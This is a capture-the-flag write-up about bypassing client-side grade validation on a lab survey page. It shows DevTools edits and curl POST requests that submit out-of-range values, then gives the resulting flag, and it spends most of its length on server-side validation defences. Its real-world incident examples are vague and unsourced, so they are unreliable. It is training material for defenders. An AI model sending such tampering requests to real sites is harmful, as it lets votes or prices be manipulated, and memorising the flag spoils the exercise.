# Breach #09: Integer Input Validation Bypass

## Vulnerability Overview

**Vulnerability Type**: Input Validation Bypass, Client-Side Security Controls
**Risk Level**: Medium
**Attack Vector**: HTML Manipulation, Direct HTTP Requests

The survey page implements grade validation only on the client-side (HTML `max` attribute), allowing attackers to bypass restrictions by manipulating HTML or sending direct HTTP requests with values outside the intended range.

## Discovery Process

### Step 1: Identify the Survey Form
**URL**: `http://192.168.64.2/index.php?page=survey`

The survey page contains a grade selection with values restricted to 1-10 using HTML form controls.

![Survey page with grade selection](./images/01-survey-page.png)

### Step 2: Inspect the HTML
Using browser DevTools, inspect the grade input element:

```html
<select name="valeur">
  <option value="1">1</option>
  <option value="2">2</option>
  ...
  <option value="10">10</option>
</select>
```

Or if it's an input field:
```html
<input type="number" name="valeur" min="1" max="10">
```

**Key Finding**: Validation is only enforced in HTML, not on the server.

### Step 3: Bypass Using DevTools
**Method 1: Modify HTML Attributes**
1. Open DevTools (F12)
2. Locate the `valeur` input element
3. Modify option values (e.g., change `value="2"` to `value="9999"`)
4. Select the modified value (9999)
5. Submit the form

![DevTools modification](./images/02-devtools-modify.png)

### Step 4: Get the Flag
After submitting the modified value, the server accepts it and returns the flag:

![Flag obtained](./images/03-flag-obtained.png)

### Alternative: Bypass Using curl
**Method 2: Direct HTTP POST Request**

Bypass the frontend entirely by sending a POST request directly:

```bash
curl -X POST http://192.168.64.2/index.php?page=survey \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "sujet=2&valeur=100"
```

**Response**:
```html
<h2>The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2>
```

## Vulnerability Explanation

### Client-Side vs Server-Side Validation

#### Client-Side Validation (UX Only)
- **Purpose**: Improve user experience, provide immediate feedback
- **Implementation**: HTML attributes (`min`, `max`, `required`), JavaScript
- **Security Value**: **NONE** - Can be bypassed by any attacker

#### Server-Side Validation (Security)
- **Purpose**: Enforce business rules and security constraints
- **Implementation**: Backend validation logic
- **Security Value**: **CRITICAL** - Last line of defense

### The Trust Boundary Problem

```
┌─────────────────┐         ┌─────────────────┐
│   Browser       │         │   Server        │
│  (Untrusted)    │────────>│   (Trusted)     │
└─────────────────┘         └─────────────────┘
     Client-Side                Server-Side
     Validation                 Validation
     ❌ Bypassable              ✅ Enforced
```

**Never trust client input** - All data from the client must be validated on the server.

### Why This Vulnerability Exists

1. **Client-Side Only Validation**
   - HTML `max` attribute
   - JavaScript validation
   - These are for UX, not security

2. **Missing Server-Side Checks**
   - Server accepts any value for `valeur`
   - No type checking (integer)
   - No range validation (0-10)
   - No input sanitization

3. **Lack of Authentication**
   - No user verification before accepting votes
   - Anyone can submit arbitrary data

## Attack Scenarios

### Scenario 1: Grade Manipulation
```bash
# Submit maximum possible grade
curl -X POST http://192.168.64.2/index.php?page=survey \
     -d "sujet=1&valeur=999999"
```

### Scenario 2: Negative Values
```bash
# Submit negative grades
curl -X POST http://192.168.64.2/index.php?page=survey \
     -d "sujet=1&valeur=-100"
```

### Scenario 3: Non-Integer Values
```bash
# Submit non-numeric data
curl -X POST http://192.168.64.2/index.php?page=survey \
     -d "sujet=1&valeur=abc"
```

## Prevention Measures

### 1. Server-Side Input Validation

**PHP Example**:
```php
<?php
// Receive input
$valeur = $_POST['valeur'];

// Validate type
if (!is_numeric($valeur)) {
    die("Error: Grade must be a number");
}

// Convert to integer
$valeur = intval($valeur);

// Validate range
if ($valeur < 1 || $valeur > 10) {
    die("Error: Grade must be between 1 and 10");
}

// Process valid input
saveGrade($valeur);
?>
```

**Node.js Example**:
```javascript
const valeur = parseInt(req.body.valeur);

// Validate type and range
if (isNaN(valeur) || valeur < 1 || valeur > 10) {
    return res.status(400).json({
        error: "Grade must be between 1 and 10"
    });
}

// Process valid input
saveGrade(valeur);
```

### 2. Implement Defense in Depth

```
Layer 1: Client-Side (UX)
  ↓ HTML validation, JavaScript checks

Layer 2: Server-Side (Security)
  ↓ Type validation, Range checking

Layer 3: Business Logic (Integrity)
  ↓ Authentication, Authorization

Layer 4: Database (Constraints)
  ↓ CHECK constraints, Data types
```

### 3. Use a Validation Framework

**PHP with Respect/Validation**:
```php
use Respect\Validation\Validator as v;

$gradeValidator = v::intVal()->between(1, 10);

if (!$gradeValidator->validate($valeur)) {
    throw new InvalidArgumentException('Invalid grade');
}
```

**Node.js with Joi**:
```javascript
const Joi = require('joi');

const schema = Joi.object({
    valeur: Joi.number().integer().min(1).max(10).required()
});

const { error, value } = schema.validate(req.body);
if (error) {
    return res.status(400).json({ error: error.details[0].message });
}
```

### 4. Database-Level Constraints

```sql
CREATE TABLE survey_responses (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT NOT NULL,
    subject_id INT NOT NULL,
    grade INT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    CHECK (grade >= 1 AND grade <= 10)
);
```

### 5. Implement Authentication

```php
// Require authentication before accepting survey responses
if (!isAuthenticated()) {
    http_response_code(401);
    die("Authentication required");
}

// Verify user hasn't already voted
if (hasUserVoted($userId, $subjectId)) {
    http_response_code(403);
    die("You have already voted");
}
```

## Real-World Impact

### Similar Vulnerabilities
1. **Price Manipulation**: E-commerce sites accepting client-side prices
2. **Privilege Escalation**: Admin flags set via form manipulation
3. **Data Integrity**: Inventory systems accepting negative quantities
4. **Rate Limiting Bypass**: Vote/rating systems without server validation

### Example Cases
- **2019**: Major e-commerce platform allowed price manipulation via DevTools
- **2020**: Social media site accepted negative "like" counts
- **2021**: Survey platform allowed unlimited responses by bypassing client checks

## References

- [OWASP - Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html)

## Flag

```
03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```
